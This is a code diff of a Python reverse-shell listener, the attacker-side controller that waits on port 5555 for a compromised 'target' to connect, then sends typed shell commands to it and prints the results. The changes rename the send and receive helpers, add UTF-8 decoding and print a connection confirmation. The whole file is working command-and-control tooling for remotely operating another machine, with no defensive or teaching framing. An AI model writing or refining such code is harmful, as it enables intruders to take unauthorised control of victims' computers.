@@ -1,34 +1,35 @@
 import socket
 import json
 
-def send(data):
+def reliable_send(data):
     jsondata = json.dumps(data)
-    target.send(jsondata.encode())
+    target.send(jsondata.encode('utf-8'))
 
-def recieve():
-    data = ''
+def reliable_recieve():
+    data = ""
     while True:
         try:
-            data = data + target.recv(1024).decode().rstrip()
+            chunk = target.recv(1024).decode('utf-8', errors='replace')
+            data += chunk
             return json.loads(data)
         except ValueError:
             continue
 
-
 def target_comm():
     while True:
-        command = input('* Shell~%s: ' %str(ip))
-        send(command)
+        command = input('* Shell~%s: ' % str(ip))
+        reliable_send(command)
         if command == 'quit':
             break
         else:
-            result = recieve()
-            print(result) 
+            result = reliable_recieve()
+            print(result)
 
-sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-sock.bind(('Enter your ip','5555'))
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('Enter your ip', 5555))
 print(':) Listening for connections...')
 sock.listen(5)
-target,ip = sock.accept()
-print('>:) Target Connected From' + str(ip))
+target, ip = sock.accept()
+confirmation = target.recv(1024).decode('utf-8')
+print(f">:) Target Connected From {str(ip)}, Confirmation: {confirmation}")
 target_comm()
